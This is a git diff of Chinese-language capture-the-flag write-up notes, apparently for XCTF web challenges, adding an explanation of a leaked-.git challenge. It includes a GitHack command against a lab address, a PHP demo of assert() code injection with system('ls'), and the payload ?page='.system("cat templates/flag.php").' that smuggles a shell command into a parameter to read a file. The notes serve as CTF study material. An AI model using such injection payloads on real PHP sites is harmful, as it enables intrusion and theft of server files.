@@ -137,6 +137,8 @@ PING 1.1.1.1 (1.1.1.1) 56(84) bytes of data.
 
 通过控制GET参数`a=a&b=1235a`显示flag.
 
+## 001_Cat
+
 ## 001_ics-06
 
 只有`报表中心`菜单可以跳转到`index.php`, 选择日期点确认没有反应, 查看源码, cookie未果.
@@ -199,7 +201,14 @@ URL中自动携带参数`id=1`, 将`id=1`改成`id=flag`, 自动跳回到`id=1`,
     python /Users/lixiaolong/tools/GitHack/GitHack.py http://111.198.29.45:54372/.git/
     ```
 
-审计源码发现`flag.php`为空, `index.php`中使用`assert()`对`$page`校验`..`
+审计源码发现`flag.php`内容为
+
+```
+// TODO
+// $FLAG = '';
+```
+
+说明flag在该文件中, 但是git应该不是最新的代码, `index.php`中使用`assert()`对`$page`校验`..`, 存在命令执行漏洞.
 
 ```php
 <?php
@@ -221,3 +230,5 @@ $a = "'.system('ls').'";
 assert("strpos('$a', 'bc') === 1");
 ?>
 ```
+
+构造输入`?page='.system("cat templates/flag.php").'`, 获取到最新的flag.php源码, 该内容被浏览器作为php解析, 所以查看源码, 拿到flag.
